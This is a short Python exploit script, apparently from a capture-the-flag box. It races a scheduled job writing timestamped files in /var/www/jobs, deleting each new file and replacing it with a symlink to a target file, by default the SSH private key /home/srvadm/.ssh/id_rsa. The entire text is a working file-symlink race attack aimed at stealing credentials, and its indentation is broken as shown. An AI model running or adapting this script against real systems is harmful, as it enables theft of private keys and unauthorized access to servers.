import os                                                                                      
import datetime                                                                                
import sys                                                                                     

file_path = "/var/www/jobs"                                                                    
target_file= "/home/srvadm/.ssh/id_rsa"                                                        

print ("Usage: <script.py> <target_filename>")                                                 

if len(sys.argv) == 1:                                                                         
	print ("No target file specified using default [%s]" % target_file)                    
else:                                                                                          
	target_file=sys.argv[1]                                                                

print ("Trying to symlink file: %s" %target_file)                                              
while (True):                                                                                  
	thefile = os.path.join(file_path,datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
		if os.path.isfile(thefile):                                                            
			print("Found the file! Lets Remove it!")                                       
			os.remove(thefile)                                                             
			os.symlink(target_file,thefile)                                                
			print("Symlink completed for %s %s" % (target_file, thefile))                  
			break;                                                                         
